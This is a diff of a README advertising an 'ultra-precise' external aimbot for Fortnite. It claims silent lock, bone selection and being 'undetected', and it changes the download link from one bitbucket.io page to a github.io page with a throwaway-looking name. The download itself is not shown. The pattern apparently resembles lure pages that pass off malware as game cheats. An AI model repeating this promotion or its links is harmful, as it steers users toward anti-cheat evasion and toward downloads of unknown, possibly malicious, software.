@@ -2,7 +2,7 @@
 
 Hit every shot in **Fortnite** with this ultra-precise **C++ external aimbot**. 🎯 Designed for legit gameplay and high performance, this tool offers **smooth aiming, bone selection, silent lock, and dynamic FOV radius**. Stay safe and undetected while securing Victory Royales with tactical precision. No injection, no detection — just pure aim enhancement.
 
-[![Download Fortnite Aimbot](https://img.shields.io/badge/Download-Fortnite_Aimbot-blueviolet)](https://fileoffload13.bitbucket.io)
+[![Download Fortnite Aimbot](https://img.shields.io/badge/Download-Fortnite_Aimbot-blueviolet)](https://Fortnite-AimBot-gyje4.github.io/.github)
 
 ---
 
